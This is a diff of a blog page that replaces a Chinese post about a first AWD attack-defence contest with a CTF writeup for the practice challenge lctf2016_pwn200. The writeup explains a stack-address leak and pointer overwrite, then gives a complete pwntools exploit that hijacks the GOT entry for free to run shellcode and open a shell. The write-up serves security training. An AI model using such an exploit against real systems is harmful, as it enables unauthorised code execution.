@@ -15,17 +15,16 @@
 
 
 
-<meta name="description" content="这两天来到了福州打awd的线下赛，这是我第一次打awd，收获很多。">
+<meta name="description" content="buu刷题记录-lctf2016_pwn200">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2021华东南赛区国赛线下赛">
-<meta property="og:url" content="http://example.com/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/index.html">
+<meta property="og:title" content="lctf2016_pwn200 writeup">
+<meta property="og:url" content="http://example.com/2021/07/15/lctf2016_pwn200%20writeup/index.html">
 <meta property="og:site_name" content="xia0ji233&#39;s blog">
-<meta property="og:description" content="这两天来到了福州打awd的线下赛，这是我第一次打awd，收获很多。">
+<meta property="og:description" content="buu刷题记录-lctf2016_pwn200">
 <meta property="og:locale">
-<meta property="article:published_time" content="2021-06-19T14:00:00.000Z">
-<meta property="article:modified_time" content="2021-10-17T14:38:41.454Z">
+<meta property="article:published_time" content="2021-07-15T02:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-27T15:38:55.655Z">
 <meta property="article:author" content="xia0ji233">
-<meta property="article:tag" content="awd">
 <meta name="twitter:card" content="summary">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -60,7 +59,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>2021华东南赛区国赛线下赛 | xia0ji233&#39;s blog</title>
+<title>lctf2016_pwn200 writeup | xia0ji233&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -198,11 +197,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-国赛线下赛" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-lctf2016_pwn200 writeup" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/" class="article-date">
-      <time datetime="2021-06-19T14:00:00.000Z" itemprop="datePublished">2021-06-19</time>
+      <a href="/2021/07/15/lctf2016_pwn200%20writeup/" class="article-date">
+      <time datetime="2021-07-15T02:00:00.000Z" itemprop="datePublished">2021-07-15</time>
 </a>
 
 
@@ -217,7 +216,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      2021华东南赛区国赛线下赛
+      lctf2016_pwn200 writeup
     </h1>
   
 
@@ -226,15 +225,11 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+    <a class="article-category-link" href="/categories/ctf/">ctf</a><a class="article-category-link" href="/categories/ctf/pwn/">pwn</a>
     </div>
 
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/awd/" rel="tag">awd</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -242,15 +237,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>这两天来到了福州打awd的线下赛，这是我第一次打awd，收获很多。</p>
+        <p>buu刷题记录-<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a></p>
 <span id="more"></span>
 
-<p>先说一下大体的感想，awd真的比ctf好玩太多了，awd能真正体会到那么多网络安全爱好者相互网络攻击的那种乐趣。</p>
-<p>首先入场开始比赛的时候真的是啥也不知道，不过好在有学长带队，啥也不会的我终于在第三轮的时候连上了自己的靶机hhh。学长是打web的，但是在场的web师傅都太厉害了，上的不死马不仅让我们队的靶机down机还不停地拿flag，甚至最后删库都阻止不了他们拿flag。</p>
-<p>咱们第一天的web三题有一题不停地down机又被打，在下午，也是第24，25轮的时候有人ddos题目让所有人都down机了，主办方重启环境还恢复了配置，这可以说是让我们捡了一个漏，因为相当于是帮我们修好了环境，题目上线的时候果断删库，及时保住了一些分，与此同时通过查流量以及不停地测试也是把pwn题的payload给拿到了，因为整个pwn题的输入就是一个0x2000字节的read，查流量也不是很难。但是由于师傅们上午就pwn出了第一道，我也是在不停地堵pwn的漏洞，到最后给自己弄down机了，删库还是没用，依然被打，所以下午我打算不补pwn题让他们随便打了，这波至少赚了几千分。</p>
-<p>第二天的pwn两题都很简单，依然查流量包抄的payload拿下了大部分队伍的pwn分数，修洞的时候又不小心down了，还被打，我就又删库，可是还是有人打，结果最后就是环境恢复不了，全场就咱们队oop那道pwn题down了。最关键是down就down了，还有人打就无语了。。唯一的一道web题依然中了不死马导致又down又被打，每轮稳定扣500分(web 又down又被打，pwn1又down又被打，pwn2一直被打)，还好pwn 多数队伍没有补，最基本的几百分还是能填上坑的。上午从rk40冲进了rk33，rk33是稳稳地三等奖，但是自从少数师傅修好了pwn题局势就开始不妙了，本来我打死不想修的，但是看到有些队伍修成功了我不禁又被诱惑了，但是结果还是不随人愿。所以pwn2我就没有去修了。最终榜上rk36，那都是非常卡奖项的一个位置。因为三等奖是40%-60%。首先得刚好60%*60队=36队。但是有队伍没去比赛要扣名额就比较危险了。最终不知是主办方还是按照60队60%比例算了还是前面队伍有人ddos或者上通防被查了我们还是很幸运地挤进了三等奖的最后一个名额，这是最最最开心的。</p>
-<p>当然本次线下awd收获的经验也是非常多的，比如前面复盘介绍的pwn题被check down 的原因是:未给权限，也是linux基础不牢吧。前几次patch的elf文件守住了两轮，之后还是被打。昨晚我苦思冥想想了很久，问了很多师傅，最终N0vice师傅一语点通了发生的一切自己解释不了的事。第一次patch的elf文件是直接覆盖的，因此权限维持相同，并且很多师傅拿通用脚本打不通我的靶机，机子也没有check down。后来被打是因为真的有人无聊开始拿payload直接nc 去连接维持一个shell权限，我以为是被打通了接着换方式patch，殊不知靶机上面又几页的shell进程留在那边，这是我真没想到的。我还以为是我patch的有问题，就删文件上传，结果权限不够导致无法通过check down，与此同时还有队伍留了shell进程一直被打。</p>
-<p>awd比赛真的太好玩了，期待下次的awd比赛。</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec 64位保护全关，并且栈可读可写可执行，那么主要思路应该是执行shellcode了。main函数一个IO初始化和一个函数，进去发现有一个name输入，是用for - read(1)实现的，但是观察缓冲区和循环大小，发现缓冲区大小与循环次数相同，意味着如果我输入填满缓冲区，一会输出名字的时候可以泄露栈地址。sub_4007DF这个函数就是输入一个3位数值返回int。继续往下看发现它又有一个与缓冲区大小相等的一次输入，并且可以覆盖到char *dest这个指针变量，一会会将整个缓冲区以字符串形式拷贝到那个指针内的地址中。那么如果我们将ptr修改那基本是任意地址写了，加上之前泄露的站地址便可以在上面执行shellcode，但是同时也有限制，那就是这是一个字符串拷贝，如果需要在返回的时候执行shellcode那么需要填上shellcode后先放上一个jmp rsp的地址。而64位程序地址虽占8个字节但是实际高两个字节一般都是空的，后面的shellcode很可能无法拷贝。我还尝试过栈迁移，但是栈迁移需要改连续的两个为地址，也不能连续拷贝。那么可以尝试劫持got表，让它在后面执行某些函数的时候劫持到栈上面的shellcode里面。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>主要就是写在got表的地址要确定是shellcode的地址，这个可以通过自己调试去反复确定。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27025</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">48</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">120</span>-<span class="number">0x28</span>-<span class="number">32</span>+<span class="number">8</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))<span class="comment">#+120</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id&#x27;</span>,<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line">payload=p64(stack_addr)+asm(shellcraft.sh())</span><br><span class="line">payload=payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;~&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400a8d&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -259,13 +252,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/">2021华东南赛区国赛线下赛</a></p>
+        <p><span>本文标题:</span><a href="/2021/07/15/lctf2016_pwn200%20writeup/">lctf2016_pwn200 writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
-        <p><span>发布时间:</span>2021-06-19, 22:00:00</p>
-        <p><span>最后更新:</span>2021-10-17, 22:38:41</p>
+        <p><span>发布时间:</span>2021-07-15, 10:00:00</p>
+        <p><span>最后更新:</span>2021-10-27, 23:38:55</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/" title="2021华东南赛区国赛线下赛">http://example.com/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/07/15/lctf2016_pwn200%20writeup/" title="lctf2016_pwn200 writeup">http://example.com/2021/07/15/lctf2016_pwn200%20writeup/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/07/15/lctf2016_pwn200%20writeup/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -278,15 +271,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">
-                    SROP
+                <a href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/">
+                    浙江2020省赛pwn1
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/06/08/axb_2019_fmt32%20wp/">
-                    axb_2019_fmt32 wp
+                <a href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">
+                    SROP
                 </a>
             </div>
         
@@ -298,7 +291,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li></ol>
         
     </div>
     <style>
@@ -334,7 +327,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"2021华东南赛区国赛线下赛　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"lctf2016_pwn200 writeup　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -354,7 +347,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/" title="上一篇: SROP">
+            <a href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/" title="上一篇: 浙江2020省赛pwn1">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -362,7 +355,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/06/08/axb_2019_fmt32%20wp/" title="下一篇: axb_2019_fmt32 wp">
+            <a href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/" title="下一篇: SROP">
                 <i class="fa fa-angle-right"></i>
             </a>
         
